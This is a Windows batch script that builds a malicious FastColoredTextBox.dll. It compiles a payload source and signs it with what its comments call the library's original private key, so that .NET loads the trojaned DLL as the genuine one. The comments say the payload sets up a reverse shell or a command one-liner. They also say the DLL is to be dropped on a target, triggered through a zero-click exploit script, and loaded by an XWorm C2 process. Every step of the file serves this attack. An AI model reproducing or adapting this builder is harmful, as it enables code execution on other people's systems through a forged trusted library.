@echo off
REM ================================================================
REM build.bat - Malicious FastColoredTextBox.dll builder
REM
REM WHAT THIS DOES:
REM   Compiles FastColoredTextBox.cs into a DLL and signs it with
REM   the original private key (FCTB_key.snk). The output DLL has
REM   a fully valid strong-name signature matching the original,
REM   so .NET Framework will load it without any bypass tricks.
REM
REM FOLDER LAYOUT EXPECTED:
REM   build.bat               <- this script
REM   FCTB_key.snk            <- original private key
REM   payload\
REM     FastColoredTextBox.cs <- the payload source
REM
REM PREREQUISITES:
REM   .NET Framework SDK must be installed so csc.exe and sn.exe
REM   are available. The script tries to find them automatically.
REM
REM USAGE:
REM   1. Edit payload\FastColoredTextBox.cs
REM      - Set your IP/port if using reverse shell
REM      - Or change the cmd.exe argument for a one-liner
REM   2. Run:  build.bat
REM   3. Output: FastColoredTextBox.dll  (ready to drop on target)
REM ================================================================

echo.
echo [*] FastColoredTextBox.dll payload builder
echo ================================================================
echo.

REM ----------------------------------------------------------------
REM Locate csc.exe (C# compiler)
REM ----------------------------------------------------------------
set CSC=
where csc.exe >nul 2>&1 && set CSC=csc.exe

if not defined CSC (
    if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" (
        set CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
    )
)
if not defined CSC (
    if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" (
        set CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
    )
)
if not defined CSC (
    echo [!] ERROR: csc.exe not found.
    echo [!] Install .NET Framework SDK or add it to PATH.
    exit /b 1
)
echo [+] Found csc.exe: %CSC%

REM ----------------------------------------------------------------
REM Locate sn.exe (strong-name tool)
REM ----------------------------------------------------------------
set SN=
where sn.exe >nul 2>&1 && set SN=sn.exe

if not defined SN (
    if exist "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\sn.exe" (
        set SN=C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\sn.exe
    )
)
if not defined SN (
    if exist "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\x64\sn.exe" (
        set SN=C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\x64\sn.exe
    )
)
if not defined SN (
    echo [!] ERROR: sn.exe not found.
    echo [!] Install Windows SDK or add it to PATH.
    exit /b 1
)
echo [+] Found sn.exe: %SN%
echo.

REM ----------------------------------------------------------------
REM Sanity checks
REM ----------------------------------------------------------------
if not exist "FCTB_key.snk" (
    echo [!] ERROR: FCTB_key.snk not found in current directory.
    exit /b 1
)
if not exist "payload\FastColoredTextBox.cs" (
    echo [!] ERROR: payload\FastColoredTextBox.cs not found.
    exit /b 1
)
echo [+] All required files present.
echo.

REM ----------------------------------------------------------------
REM STEP 1 - Verify the key
REM FCTB_key.snk is a full keypair - sn -t only works on public-key-
REM only files. We extract the public key first with sn -p, then
REM check the token with sn -t. Expected: fb8aa12b994ef61b
REM ----------------------------------------------------------------
echo [*] STEP 1: Verifying private key produces correct PublicKeyToken...
"%SN%" -p FCTB_key.snk pubkey_check.snk >nul 2>&1
"%SN%" -t pubkey_check.snk
del pubkey_check.snk >nul 2>&1
echo [*] Expected PublicKeyToken: fb8aa12b994ef61b
echo [*] If the token above does NOT match, stop and check your key file.
echo.
pause

REM ----------------------------------------------------------------
REM STEP 2 - Compile and sign
REM /platform:x64 is required - XWorm C2 is a 64-bit process and
REM will reject a 32-bit or AnyCPU DLL with hr=0x8007000b.
REM ----------------------------------------------------------------
echo [*] STEP 2: Compiling and signing DLL (x64)...
echo.

"%CSC%" /target:library ^
        /out:FastColoredTextBox.dll ^
        /keyfile:FCTB_key.snk ^
        /platform:x64 ^
        /reference:System.dll ^
        /reference:System.Windows.Forms.dll ^
        /reference:System.Drawing.dll ^
        payload\FastColoredTextBox.cs

if errorlevel 1 (
    echo.
    echo [!] COMPILE FAILED - check errors above.
    exit /b 1
)
echo.
echo [+] Compiled successfully: FastColoredTextBox.dll
echo.

REM ----------------------------------------------------------------
REM STEP 3 - Confirm public key token on output DLL
REM Must match: fb8aa12b994ef61b
REM ----------------------------------------------------------------
echo [*] STEP 3: Checking PublicKeyToken on output DLL...
"%SN%" -T FastColoredTextBox.dll
echo [*] Expected: fb8aa12b994ef61b
echo.

REM ----------------------------------------------------------------
REM STEP 4 - Verify architecture is x64
REM Must show PE32+ and 32BITREQ : 0
REM ----------------------------------------------------------------
echo [*] STEP 4: Checking architecture...
where corflags.exe >nul 2>&1
if not errorlevel 1 (
    corflags.exe FastColoredTextBox.dll
    echo [*] Expected: PE = PE32+  /  32BITREQ = 0  /  Signed = 1
) else (
    echo [*] corflags.exe not found - skipping architecture check.
    echo [*] Verify manually that /platform:x64 compiled correctly.
)
echo.

REM ----------------------------------------------------------------
REM STEP 5 - Verify cryptographic signature
REM If this passes, the CLR will accept the DLL with no complaints.
REM ----------------------------------------------------------------
echo [*] STEP 5: Verifying strong-name signature...
"%SN%" -v FastColoredTextBox.dll
if errorlevel 1 (
    echo.
    echo [!] SIGNATURE VERIFICATION FAILED.
    echo [!] The DLL will NOT load on .NET Framework 4.8.
    echo [!] Check that FCTB_key.snk is the correct private key.
    exit /b 1
)
echo.
echo [+] Signature valid - CLR will accept this DLL.
echo.

REM ----------------------------------------------------------------
REM DONE
REM ----------------------------------------------------------------
echo ================================================================
echo [+] BUILD COMPLETE
echo [+] Output: FastColoredTextBox.dll  (x64, fully signed)
echo [+] Run exploit.py --zero-click to deploy and trigger.
echo ================================================================
echo.
